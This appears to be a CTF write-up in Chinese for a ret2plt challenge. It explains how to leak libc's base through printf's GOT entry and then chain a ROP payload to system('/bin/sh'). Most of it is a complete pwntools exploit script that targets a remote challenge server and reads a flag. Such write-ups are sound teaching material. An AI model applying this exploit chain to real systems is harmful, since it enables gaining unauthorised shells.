---
title: ROP3-WriteUp
date: 2024-08-09 16:07:00
category: PWN
tags: pwn
---

## Ret2plt

>這題跟上題就差在這題是dynamic linking，所以我們需要leak libc位置後使用libc中的東西call shell。

+ print的got塞入rdi後call print@plt這樣我們就知道print function在這次程式執行時是在alsr的哪個位置
+ 然後再用 `readelf -s` 找出並剪掉printf在libc中的offset，這樣我們就得到libc的base address
+ 再call回main overflow執行我們的rop chain就可以拿到shell了🥳

```python
from pwn import *
import warnings

warnings.filterwarnings("ignore", category=BytesWarning)

context.arch = "amd64"
# context.terminal = ['tmux', 'splitw', '-h']
r = remote("35.229.243.81",10103)
# r = process("rop3")
l = ELF("../libc.so.6")

pop_rdi = 0x4011f9
print_got = 0x404018
plt_print = 0x401060
ret = 0x40101a
name_buf = 0x404060
mainn= 0x4011fe
leave_ret = 0x4011ef

p1 = b'a'*0x18
p1 +=p64(ret)
p1 += p64(pop_rdi)+p64(print_got)+p64(plt_print)
p1 += p64(ret) + p64(mainn)

r.sendlineafter(b'name?',b' ')
#pause()
r.sendlineafter(b'vuln:',p1)

r.recv()

l.address = u64(r.recv(6).ljust(8, b"\0")) - 0x606F0
success ('libc -> %s' % hex( l.address )) 

payload = flat(
    b'a'*0x18,
    pop_rdi,
    next(l.search('/bin/sh\0')),
    ret,
    l.sym.system
)

r.sendlineafter(b'name?',b' ')
r.sendlineafter(b'vuln:',payload)

r.sendline(b'cat /home/`whoami`/flag*')

r.interactive()
```
